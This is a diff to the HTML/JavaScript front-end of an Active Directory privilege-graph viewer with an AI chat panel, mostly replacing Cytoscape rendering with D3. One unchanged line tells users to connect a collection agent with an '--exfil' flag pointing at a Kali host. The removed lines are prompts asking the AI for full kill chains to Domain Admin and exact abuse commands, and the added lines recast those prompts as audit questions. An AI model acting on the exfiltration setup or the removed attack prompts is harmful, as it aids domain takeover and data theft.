@@ -6,7 +6,7 @@
   <title>NECROMANCER v2 — The Grimoire</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/cytoscape/3.28.1/cytoscape.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.9.0/d3.min.js"></script>
   <style>
     :root {
       --bg:          #0f1117;
@@ -163,7 +163,35 @@
       overflow: hidden;
     }
 
-    #cy { width: 100%; height: 100%; }
+    #cy {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+    }
+    #cy svg { width: 100%; height: 100%; }
+
+    /* D3 Node Cards */
+    .d3-node-card {
+      cursor: pointer;
+      transition: filter 0.15s;
+    }
+    .d3-node-card:hover { filter: brightness(1.25); }
+    .d3-node-card.highlighted rect { stroke-width: 3; }
+    .d3-node-card.dimmed { opacity: 0.12; }
+    .d3-node-rect {
+      rx: 6; ry: 6;
+      stroke-width: 1.5;
+    }
+    .d3-node-icon { font-size: 13px; dominant-baseline: central; text-anchor: middle; }
+    .d3-node-type { font-size: 8px; dominant-baseline: central; text-anchor: middle; letter-spacing: 1px; font-family: 'Share Tech Mono', monospace; opacity: 0.7; }
+    .d3-node-label { font-size: 10px; dominant-baseline: central; text-anchor: middle; font-family: 'Share Tech Mono', monospace; }
+    .d3-edge { stroke-width: 1.5; fill: none; }
+    .d3-edge-label { font-size: 8px; font-family: 'Share Tech Mono', monospace; fill: #6a6a8a; text-anchor: middle; }
+    .d3-edge-critical { stroke: #8b0000 !important; stroke-width: 2.5 !important; }
+    .d3-edge-highlighted { stroke: #ffd700 !important; stroke-width: 3 !important; }
+    .d3-admincount rect { stroke: #d4ac0d !important; stroke-width: 3 !important;
+      filter: drop-shadow(0 0 8px rgba(212,172,13,0.6)); }
+
 
     #graph-overlay {
       position: absolute;
@@ -711,7 +739,7 @@
       <div id="node-props"></div>
       <div class="node-btn-row">
         <button class="btn" onclick="focusSelectedNode()">🎯 FOCUS</button>
-        <button class="btn" onclick="investigateNode()">☠ WHAT IF?</button>
+        <button class="btn" onclick="investigateNode()">🔍 WHAT IF?</button>
       </div>
     </div>
 
@@ -730,7 +758,7 @@
       <div id="edge-info-title" style="font-family:var(--title); color:var(--red-bright); font-size:13px; margin-bottom:8px; padding-bottom:7px; border-bottom:1px solid var(--border); word-break:break-all;">—</div>
       <div id="edge-props"></div>
       <button class="btn" style="width:100%;margin-top:11px;font-size:11px;background:linear-gradient(135deg, #2a0000, #4a0000);color:#ffcccc;border-color:#e74c3c;"
-              onclick="investigateEdge()">☠ HOW TO ABUSE THIS?</button>
+              onclick="investigateEdge()">🔍 AUDIT THIS RELATIONSHIP</button>
     </div>
 
     <!-- Legend -->
@@ -752,10 +780,10 @@
 
     <!-- Chat -->
     <div id="chat-panel">
-      <div id="chat-header">☠ CONSULT THE DEAD — PRIVILEGE ARCHAEOLOGY</div>
+      <div id="chat-header">🔍 CONSULT THE GRIMOIRE — PRIVILEGE ARCHAEOLOGY</div>
       <div id="chat-messages">
         <div class="chat-msg system">
-          The Grimoire awaits. Load AD data to begin consulting the dead.<br><br>
+          The Grimoire awaits. Load BloodHound data to begin the privilege archaeology audit.<br><br>
           Connect an agent with <code style="color:#e74c3c">--exfil https://&lt;kali-ip&gt;:8443/upload</code><br>
           or click <strong style="color:#9b59b6">⚡ OFFLINE UPLOAD</strong> to load existing data.
         </div>
@@ -769,7 +797,7 @@
       <div id="chat-input-area">
         <div id="chat-row">
           <textarea id="chat-input"
-            placeholder='"What if I compromise DC1?" • "Find Kerberoastable paths"'
+            placeholder='"What if DC1 were compromised?" • "Find stale delegations" • "Audit RBCD exposure"'
             disabled></textarea>
           <button id="chat-send" onclick="sendChat()" disabled title="Send (Enter)">☠</button>
         </div>
@@ -1142,90 +1170,338 @@ function initCytoscape(data) {
   });
 }
 
-function buildStyle() {
-  const s = [
-    {
-      selector: 'node',
-      style: {
-        'background-color': '#1e1830',
-        'border-width': 2,
-        'border-color': '#5a3070',
-        'label': 'data(displayLabel)',
-        'color': '#e8e8f8',
-        'font-size': '10px',
-        'font-family': '"Share Tech Mono", monospace',
-        'text-valign': 'center',
-        'text-halign': 'center',
-        'text-outline-color': '#08080f',
-        'text-outline-width': '2px',
-        'width': 50,
-        'height': 50,
-        'text-max-width': '64px',
-        'text-wrap': 'ellipsis',
-        'overlay-opacity': 0,
-      }
+// ── D3 Graph Renderer ─────────────────────────────────────────────────────────
+
+const NODE_W = 130, NODE_H = 40;
+const CRITICAL_EDGES = new Set(['GenericAll','DCSync','WriteDACL','WriteOwner','AllExtendedRights']);
+
+const TYPE_META = {
+  User:         { bg:'#1e0847', border:'#6c3483', text:'#af7be4', icon:'👤' },
+  Group:        { bg:'#2d0000', border:'#922b21', text:'#e08080', icon:'👥' },
+  Computer:     { bg:'#0a1828', border:'#2e86c1', text:'#7db8e0', icon:'💻' },
+  Domain:       { bg:'#2a1e00', border:'#b7950b', text:'#f0c040', icon:'🌐' },
+  GPO:          { bg:'#0a2010', border:'#1e8449', text:'#5dbc78', icon:'📜' },
+  OU:           { bg:'#0a1622', border:'#2874a6', text:'#7fb3d3', icon:'📁' },
+  CertTemplate: { bg:'#280014', border:'#ad1457', text:'#ec407a', icon:'🔖' },
+  EnterpriseCA: { bg:'#1a000c', border:'#880e4f', text:'#f48fb1', icon:'🏛' },
+  _default:     { bg:'#1a1830', border:'#5a3070', text:'#e8e8f8', icon:'◆' },
+};
+
+let d3svg    = null;
+let d3sim    = null;
+let d3gMain  = null; // main group for pan/zoom
+let d3Nodes  = [];   // current node data
+let d3Edges  = [];   // current edge data
+
+function initCytoscape(data) {
+  edgeIdx = 0;
+
+  globalNodes = data.nodes.map(n => ({
+    group: 'nodes',
+    data: {
+      id:          n.id,
+      label:       shortLabel(realLabel(n.label)),
+      displayLabel: shortLabel(realLabel(n.label)),
+      fullLabel:   realLabel(n.label),
+      token:       n.properties?.token    || '',
+      type:        n.type,
+      domain:      n.properties?.domain   || '',
+      admincount:  n.properties?.admincount === 'true',
+      highvalue:   n.properties?.highvalue  === 'true',
+      enabled:     n.properties?.enabled   !== 'false',
+      description: n.properties?.description || '',
+      sam:         n.properties?.sam || '',
+      os:          n.properties?.os  || '',
     }
-  ];
+  }));
 
-  // Type colours + distinct shapes
-  const TYPE_SHAPES = {
-    User: 'ellipse', Group: 'diamond', Computer: 'roundrectangle',
-    Domain: 'pentagon', GPO: 'tag', OU: 'barrel',
-    CertTemplate: 'hexagon', EnterpriseCA: 'star',
-  };
-  for (const [type, c] of Object.entries(TYPE_COLORS)) {
-    s.push({ selector: `node[type="${type}"]`,
-      style: { 'background-color': c.bg, 'border-color': c.border, 'color': c.text,
-               'shape': TYPE_SHAPES[type] || 'ellipse' } });
+  const edgeSeen = new Set();
+  globalEdges = [];
+  for (const e of data.edges) {
+    const key = `${e.source}|${e.relation}|${e.target}`;
+    if (!edgeSeen.has(key)) {
+      edgeSeen.add(key);
+      globalEdges.push({ group:'edges', data:{
+        id: `e${edgeIdx++}`, source: e.source, target: e.target, label: e.relation
+      }});
+    }
   }
 
-  // High-value nodes get larger + gold glow
-  s.push({ selector: 'node[?admincount],[?highvalue]',
-    style: { 'width': 66, 'height': 66, 'border-width': 3, 'font-size': '11px',
-             'border-color': '#d4ac0d', 'shadow-blur': 16, 'shadow-color': '#d4ac0d', 'shadow-opacity': 0.5 } });
-
-  // Disabled = ghost
-  s.push({ selector: 'node[enabled=false]',
-    style: { 'opacity': 0.42, 'border-style': 'dashed' } });
-
-  // Highlight
-  s.push({ selector: 'node.highlighted',
-    style: { 'border-color': '#ffd700', 'border-width': 3, 'width': 54, 'height': 54 } });
-
-  // Dimmed
-  s.push({ selector: 'node.dimmed',  style: { 'opacity': 0.14 } });
-  s.push({ selector: 'edge.dimmed',  style: { 'opacity': 0.06 } });
-
-  // Base edge
-  s.push({ selector: 'edge', style: {
-    'line-color': '#3a2850',
-    'width': 1.5,
-    'target-arrow-color': '#7a3090',
-    'target-arrow-shape': 'triangle',
-    'curve-style': 'bezier',
-    'label': 'data(label)',
-    'font-size': '8px',
-    'color': '#6a6a8a',
-    'font-family': '"Share Tech Mono", monospace',
-    'text-rotation': 'autorotate',
-    'text-background-color': '#0f1117',
-    'text-background-opacity': 0.8,
-    'text-background-padding': '2px',
-    'overlay-opacity': 0,
-  }});
-
-  // Critical edges
-  for (const r of ['GenericAll','DCSync','WriteDACL','WriteOwner','AllExtendedRights']) {
-    s.push({ selector: `edge[label="${r}"]`,
-      style: { 'line-color': '#8b0000', 'width': 2.5, 'target-arrow-color': '#c0392b', 'color': '#c0392b' } });
-  }
-
-  // Highlighted edge
-  s.push({ selector: 'edge.highlighted',
-    style: { 'line-color':'#ffd700', 'width':3, 'target-arrow-color':'#ffd700', 'color':'#ffd700', 'z-index':9999 } });
-
-  return s;
+  renderD3Graph(globalNodes, globalEdges);
 }
+
+function renderD3Graph(nodes, edges) {
+  const container = document.getElementById('cy');
+  container.innerHTML = '';
+
+  if (!nodes || nodes.length === 0) return;
+
+  const W = container.clientWidth || 900;
+  const H = container.clientHeight || 600;
+
+  // Build node lookup
+  const nodeById = {};
+  nodes.forEach(n => { nodeById[n.data.id] = n; });
+
+  // Filter edges to only those with valid endpoints
+  const validEdges = edges.filter(e => nodeById[e.data.source] && nodeById[e.data.target]);
+
+  // D3 simulation data (mutable copies)
+  const simNodes = nodes.map(n => ({ ...n.data, x: W/2 + (Math.random()-0.5)*400, y: H/2 + (Math.random()-0.5)*400 }));
+  const simEdges = validEdges.map(e => ({ ...e.data }));
+
+  d3Nodes = simNodes;
+  d3Edges = simEdges;
+
+  // Build id→simNode map
+  const simById = {};
+  simNodes.forEach(n => { simById[n.id] = n; });
+  simEdges.forEach(e => { e._source = simById[e.source]; e._target = simById[e.target]; });
+
+  // SVG
+  const svg = d3.select(container).append('svg')
+    .attr('width', W).attr('height', H);
+
+  // Defs: arrowhead markers
+  const defs = svg.append('defs');
+  const mkArrow = (id, color) => {
+    defs.append('marker')
+      .attr('id', id)
+      .attr('viewBox', '0 -5 10 10')
+      .attr('refX', 10).attr('refY', 0)
+      .attr('markerWidth', 6).attr('markerHeight', 6)
+      .attr('orient', 'auto')
+      .append('path')
+      .attr('d', 'M0,-5L10,0L0,5')
+      .attr('fill', color);
+  };
+  mkArrow('arrow-normal', '#7a3090');
+  mkArrow('arrow-critical', '#c0392b');
+  mkArrow('arrow-highlight', '#ffd700');
+
+  d3svg = svg;
+
+  // Pan/zoom group
+  const g = svg.append('g').attr('class', 'graph-root');
+  d3gMain = g;
+
+  // Zoom behaviour
+  const zoom = d3.zoom()
+    .scaleExtent([0.04, 6])
+    .on('zoom', ev => g.attr('transform', ev.transform));
+  svg.call(zoom);
+  svg.on('click', (ev) => {
+    if (ev.target === svg.node() || ev.target.tagName === 'svg') {
+      clearD3Highlight();
+      document.getElementById('node-info').style.display = 'none';
+      document.getElementById('edge-info').style.display = 'none';
+      selectedNode = null;
+      selectedEdge = null;
+    }
+  });
+
+  // Edge lines
+  const edgeG = g.append('g').attr('class', 'edges');
+  const edgeLine = edgeG.selectAll('.d3-edge-group')
+    .data(simEdges).enter()
+    .append('g').attr('class', 'd3-edge-group');
+
+  const paths = edgeLine.append('path')
+    .attr('class', e => 'd3-edge' + (CRITICAL_EDGES.has(e.label) ? ' d3-edge-critical' : ''))
+    .attr('stroke', e => CRITICAL_EDGES.has(e.label) ? '#8b0000' : '#3a2850')
+    .attr('marker-end', e => CRITICAL_EDGES.has(e.label) ? 'url(#arrow-critical)' : 'url(#arrow-normal)')
+    .attr('data-edge-id', e => e.id)
+    .style('cursor', 'pointer')
+    .on('click', (ev, e) => {
+      ev.stopPropagation();
+      selectedEdge = e;
+      const srcNode = simById[e.source];
+      const tgtNode = simById[e.target];
+      const src = realLabel(srcNode?.fullLabel || '');
+      const tgt = realLabel(tgtNode?.fullLabel || '');
+      document.getElementById('edge-info-title').textContent = e.label;
+      document.getElementById('edge-props').innerHTML =
+        `<div class="node-prop"><span class="np-k">Source</span><span class="np-v" title="${esc(src)}">${esc(src)}</span></div>` +
+        `<div class="node-prop"><span class="np-k">Target</span><span class="np-v" title="${esc(tgt)}">${esc(tgt)}</span></div>`;
+      document.getElementById('edge-info').style.display = 'block';
+    });
+
+  const edgeLabels = edgeLine.append('text')
+    .attr('class', 'd3-edge-label')
+    .text(e => e.label);
+
+  // Node cards
+  const nodeG = g.append('g').attr('class', 'nodes');
+  const nodeCard = nodeG.selectAll('.d3-node-card')
+    .data(simNodes).enter()
+    .append('g')
+    .attr('class', n => 'd3-node-card' + (n.admincount || n.highvalue ? ' d3-admincount' : '') + (!n.enabled ? ' d3-disabled' : ''))
+    .attr('data-node-id', n => n.id)
+    .style('cursor', 'pointer')
+    .call(d3.drag()
+      .on('start', (ev, d) => {
+        if (!ev.active) sim.alphaTarget(0.3).restart();
+        d.fx = d.x; d.fy = d.y;
+      })
+      .on('drag', (ev, d) => { d.fx = ev.x; d.fy = ev.y; })
+      .on('end', (ev, d) => {
+        if (!ev.active) sim.alphaTarget(0);
+        d.fx = null; d.fy = null;
+      })
+    )
+    .on('click', (ev, d) => {
+      ev.stopPropagation();
+      selectedNode = d;
+      highlightD3Neighbors(d);
+      showNodeInfo({ data: () => d });
+    });
+
+  nodeCard.each(function(d) {
+    const meta = TYPE_META[d.type] || TYPE_META._default;
+    const el = d3.select(this);
+
+    // Card background
+    el.append('rect')
+      .attr('class', 'd3-node-rect')
+      .attr('x', -NODE_W/2).attr('y', -NODE_H/2)
+      .attr('width', NODE_W).attr('height', NODE_H)
+      .attr('rx', 6).attr('ry', 6)
+      .attr('fill', meta.bg)
+      .attr('stroke', meta.border);
+
+    // Left type-color strip
+    el.append('rect')
+      .attr('x', -NODE_W/2).attr('y', -NODE_H/2)
+      .attr('width', 4).attr('height', NODE_H)
+      .attr('rx', 6).attr('ry', 6)
+      .attr('fill', meta.border);
+
+    // Icon
+    el.append('text')
+      .attr('class', 'd3-node-icon')
+      .attr('x', -NODE_W/2 + 20).attr('y', 0)
+      .attr('fill', meta.text)
+      .text(meta.icon);
+
+    // Entity name
+    const labelText = d.label || d.id;
+    el.append('text')
+      .attr('class', 'd3-node-label')
+      .attr('x', 10).attr('y', -6)
+      .attr('fill', meta.text)
+      .text(labelText.length > 14 ? labelText.substring(0,13)+'…' : labelText)
+      .append('title').text(d.fullLabel || d.id);
+
+    // Type badge
+    el.append('text')
+      .attr('class', 'd3-node-type')
+      .attr('x', 10).attr('y', 10)
+      .attr('fill', meta.border)
+      .text(d.type ? d.type.toUpperCase() : '');
+
+    // AdminCount star
+    if (d.admincount || d.highvalue) {
+      el.append('text')
+        .attr('x', NODE_W/2 - 10).attr('y', -NODE_H/2 + 12)
+        .attr('text-anchor', 'middle').attr('dominant-baseline', 'central')
+        .attr('font-size', '10px').attr('fill', '#d4ac0d')
+        .text('★');
+    }
+
+    // Disabled ghost
+    if (!d.enabled) {
+      el.select('rect.d3-node-rect').attr('opacity', 0.42);
+      el.style('opacity', 0.5);
+    }
+  });
+
+  // Simulation
+  const sim = d3.forceSimulation(simNodes)
+    .force('link', d3.forceLink(simEdges).id(d => d.id).distance(180).strength(0.5))
+    .force('charge', d3.forceManyBody().strength(-350))
+    .force('center', d3.forceCenter(W/2, H/2))
+    .force('collision', d3.forceCollide(85))
+    .alphaDecay(0.025)
+    .on('tick', () => {
+      // Update edge paths (curved)
+      paths.attr('d', e => {
+        const s = e._source, t = e._target;
+        if (!s || !t) return '';
+        const dx = t.x - s.x, dy = t.y - s.y;
+        const dist = Math.sqrt(dx*dx + dy*dy) || 1;
+        // Edge end: offset to card border, not center
+        const ex = t.x - (dx/dist) * (NODE_W/2 + 8);
+        const ey = t.y - (dy/dist) * (NODE_H/2 + 8);
+        const sx = s.x + (dx/dist) * (NODE_W/2 + 2);
+        const sy = s.y + (dy/dist) * (NODE_H/2 + 2);
+        // Slight curve
+        const mx = (sx + ex)/2 - dy*0.12;
+        const my = (sy + ey)/2 + dx*0.12;
+        return `M${sx},${sy} Q${mx},${my} ${ex},${ey}`;
+      });
+
+      edgeLabels.attr('x', e => {
+        if (!e._source || !e._target) return 0;
+        return (e._source.x + e._target.x)/2;
+      }).attr('y', e => {
+        if (!e._source || !e._target) return 0;
+        return (e._source.y + e._target.y)/2 - 6;
+      });
+
+      nodeCard.attr('transform', d => `translate(${d.x},${d.y})`);
+    });
+
+  d3sim = sim;
+}
+
+function highlightD3Neighbors(nodeData) {
+  if (!d3gMain) return;
+  const id = nodeData.id;
+  const neighborIds = new Set([id]);
+  d3Edges.forEach(e => {
+    if (e.source === id || e.target === id) {
+      neighborIds.add(e.source);
+      neighborIds.add(e.target);
+    }
+  });
+  d3gMain.selectAll('.d3-node-card')
+    .classed('dimmed', n => !neighborIds.has(n.id))
+    .classed('highlighted', n => n.id === id);
+  d3gMain.selectAll('.d3-edge')
+    .classed('dimmed', e => !neighborIds.has(e.source) || !neighborIds.has(e.target));
+}
+
+function clearD3Highlight() {
+  if (!d3gMain) return;
+  d3gMain.selectAll('.d3-node-card').classed('dimmed', false).classed('highlighted', false);
+  d3gMain.selectAll('.d3-edge').classed('dimmed', false);
+}
+
+function focusSelectedNode() {
+  // Pan D3 graph to center on selected node
+  if (!selectedNode || !d3svg) return;
+  const d = typeof selectedNode.data === 'function' ? selectedNode.data() : selectedNode;
+  if (!d || d.x === undefined) return;
+  const container = document.getElementById('cy');
+  const W = container.clientWidth, H = container.clientHeight;
+  const zoom = d3.zoom().scaleExtent([0.04, 6]);
+  d3svg.transition().duration(400).call(
+    d3.zoom().transform,
+    d3.zoomIdentity.translate(W/2 - d.x, H/2 - d.y)
+  );
+}
+
+function resetGraph() {
+  if (d3sim) { d3sim.stop(); d3sim = null; }
+  document.getElementById('cy').innerHTML = '';
+  document.getElementById('node-info').style.display = 'none';
+  document.getElementById('edge-info').style.display = 'none';
+  closePathInspector();
+  selectedNode = null;
+  selectedEdge = null;
+}
+
+function buildStyle() { return []; } // kept for compatibility, not used with D3
 
 function shortLabel(label) {
   if (!label) return '?';
@@ -1238,15 +1514,8 @@ function shortLabel(label) {
   return label.length > 18 ? label.substring(0, 18) + '…' : label;
 }
 
-function highlightNeighbors(node) {
-  const hood = node.neighborhood().add(node);
-  cy.elements().addClass('dimmed').removeClass('highlighted');
-  hood.removeClass('dimmed').addClass('highlighted');
-}
-
-function clearHighlight() {
-  cy.elements().removeClass('dimmed highlighted');
-}
+function highlightNeighbors(node) { highlightD3Neighbors(node); }
+function clearHighlight() { clearD3Highlight(); }
 
 function showNodeInfo(node) {
   const d = node.data();
@@ -1268,7 +1537,7 @@ function showNodeInfo(node) {
 
   document.getElementById('node-info-title').textContent = realName;
 
-  const neighborCount = cy ? node.neighborhood('node').length : 0;
+  const neighborCount = d3Edges ? d3Edges.filter(e => e.source === d.id || e.target === d.id).length : 0;
   const props = [
     ['Domain',      d.domain],
     ['SAM',         d.sam],
@@ -1294,9 +1563,10 @@ function focusSelectedNode() {
 function investigateNode() {
   if (!selectedNode) return;
   const d = selectedNode.data();
-  const q = `What if I compromise ${d.fullLabel} (${d.type})? ` +
-    `Map the complete kill chain from this entity to Domain Admin — ` +
-    `every hop, every tool, every command. Include RBCD, delegation, and ACE paths.`;
+  const q = `WHAT IF analysis: If ${d.fullLabel} (${d.type}) were compromised, ` +
+    `what is the blast radius? Trace every BloodHound relationship chain from this entity ` +
+    `— delegation paths, ACE rights, group memberships, and RBCD paths. ` +
+    `Explain which privileges would be transitively reachable and why this matters for remediation prioritization.`;
   document.getElementById('chat-input').value = q;
   document.getElementById('chat-input').focus();
   document.getElementById('node-info').style.display = 'none';
@@ -1309,14 +1579,16 @@ function investigateEdge() {
   const tgtName = e.target().data('fullLabel');
   const rel = e.data('label');
   
-  const q = `How can I abuse the ${rel} privilege from ${srcName} to ${tgtName}? Provide the exact tools, commands, and requirements.`;
+  const q = `Audit analysis: What is the risk of the ${rel} relationship from ${srcName} to ${tgtName}? ` +
+    `Why does this relationship exist, should it still exist, what would happen if it were misused, ` +
+    `and what are the remediation options?`;
   document.getElementById('chat-input').value = q;
   document.getElementById('chat-input').focus();
   document.getElementById('edge-info').style.display = 'none';
 }
 
 function highlightPath(rawPath) {
-  if (!cy) return;
+  if (!d3gMain) return;
 
   // Step 1: detokenize first so ENTITY_NNN become real names
   const pathStr = detokenize(rawPath || '');
@@ -1363,18 +1635,24 @@ function highlightPath(rawPath) {
     if (found) { matchedNodes.push(found); usedIds.add(found.data.id); }
   }
 
-  // Step 4: edges between matched nodes
-  const matchedEdges = globalEdges.filter(e =>
-    usedIds.has(e.data.source) && usedIds.has(e.data.target));
+  // Step 4: Highlight the path
+  d3gMain.selectAll('.d3-node-card')
+    .classed('dimmed', n => !usedIds.has(n.id))
+    .classed('highlighted', n => usedIds.has(n.id));
 
-  // Step 5: render
-  cy.elements().remove();
-  cy.add([...matchedNodes, ...matchedEdges]);
-  cy.elements().addClass('highlighted');
+  d3gMain.selectAll('.d3-edge')
+    .classed('dimmed', e => !usedIds.has(e.source) || !usedIds.has(e.target))
+    .classed('d3-edge-highlighted', e => usedIds.has(e.source) && usedIds.has(e.target));
 
   if (matchedNodes.length > 0) {
-    cy.layout({ name: 'breadthfirst', directed: true,
-      spacingFactor: 2.0, animate: true, animationDuration: 400 }).run();
+    const firstNode = d3Nodes.find(n => n.id === matchedNodes[0].data.id);
+    if (firstNode && d3svg) {
+      const container = document.getElementById('cy');
+      d3svg.transition().duration(400).call(
+        d3.zoom().transform,
+        d3.zoomIdentity.translate(container.clientWidth/2 - firstNode.x, container.clientHeight/2 - firstNode.y)
+      );
+    }
   }
 
   // Step 6: show Path Inspector chip-chain
@@ -1422,27 +1700,21 @@ function showPathInspector(matchedNodes, pathStr) {
 }
 
 function focusNodeById(nodeId) {
-  if (!cy) return;
-  const node = cy.getElementById(nodeId);
-  if (node.length === 0) return;
-  cy.animate({ center: { eles: node }, zoom: Math.min(cy.zoom() * 1.8, 4) }, { duration: 300 });
-  highlightNeighbors(node);
+  if (!d3svg) return;
+  const node = d3Nodes.find(n => n.id === nodeId);
+  if (!node) return;
+  const container = document.getElementById('cy');
+  d3svg.transition().duration(400).call(
+    d3.zoom().transform,
+    d3.zoomIdentity.translate(container.clientWidth/2 - node.x, container.clientHeight/2 - node.y)
+  );
+  highlightD3Neighbors(node);
   selectedNode = node;
-  showNodeInfo(node);
+  showNodeInfo({ data: () => node });
 }
 
 function closePathInspector() {
   document.getElementById('path-inspector').classList.remove('show');
-}
-
-function resetGraph() {
-  if (!cy) return;
-  cy.elements().remove();
-  document.getElementById('node-info').style.display = 'none';
-  document.getElementById('edge-info').style.display = 'none';
-  closePathInspector();
-  selectedNode = null;
-  selectedEdge = null;
 }
 
 // ── Tokenization ──────────────────────────────────────────────────────────────
